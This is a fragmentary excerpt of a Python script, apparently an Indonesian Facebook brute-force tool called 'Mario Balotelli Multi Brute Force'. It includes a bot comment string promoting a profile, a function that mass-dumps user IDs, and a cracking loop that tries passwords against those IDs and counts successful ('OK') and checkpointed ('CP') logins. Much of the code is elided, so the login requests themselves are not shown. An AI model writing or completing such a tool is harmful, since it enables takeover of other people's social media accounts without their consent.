...
kom1 = ("Anjayy keren banget bang^⁠_⁠^\n-\nhttps://www.facebook.com/marwan.nugroho.10\n-\n \nkomentar ditulis oleh bot\n \n[Semangat Bang @[104226011434605:] ]")
...
def banner():
	basari_tamvan('=' * 40)
	print(f"""{Z}[•] Mario Balotelli Multi Brute Force [•]
...
def dump_massal():
	...
	for userr in uid:
		try:
			...
			sol().print(lo, style='cyan')
			exit()
	tot = '# TOTAL ??👉 %s ID, WAJIB BERSYUKUR '%(len(id))
	if len(id)==0:
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s [M-BL] %s/%s •_• [OK] %s •_• [CP] %s •_• %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
